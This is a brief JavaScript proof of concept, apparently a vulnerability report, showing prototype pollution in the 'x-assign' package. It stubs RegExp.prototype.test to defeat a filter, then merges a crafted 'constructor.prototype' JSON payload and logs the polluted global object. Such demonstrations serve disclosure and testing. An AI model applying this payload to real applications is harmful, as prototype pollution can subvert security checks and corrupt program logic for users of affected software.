RegExp.prototype.test = () => true;
const XAssign = require('x-assign');
console.log({}.polluted);
const a = { red: 'apple' };
const b = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
const c = XAssign.assign(a, b);
console.log({}.polluted);